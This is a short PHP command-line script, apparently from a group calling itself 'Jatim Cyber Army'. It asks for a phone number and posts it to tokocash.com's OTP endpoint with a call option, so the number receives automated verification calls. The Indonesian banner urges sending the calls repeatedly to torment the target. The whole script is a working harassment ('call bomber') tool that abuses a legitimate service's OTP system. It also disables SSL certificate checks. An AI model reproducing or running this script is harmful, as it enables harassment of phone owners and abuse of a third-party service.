<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "COPYRIGHT ; Jatim Cyber Army\n\n";
echo "Thanks To : Mr.Gus [Buriq]\n\n";
echo "KIRIM BERKALI KALI BIAR TARGET MAPOSS\n\n";
echo "SETIAP NOMOR TERKIRIM MAKSIMAL 6 COK\n\n";
echo "Nomornya Cok!!\nIsiNomorCok!! : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
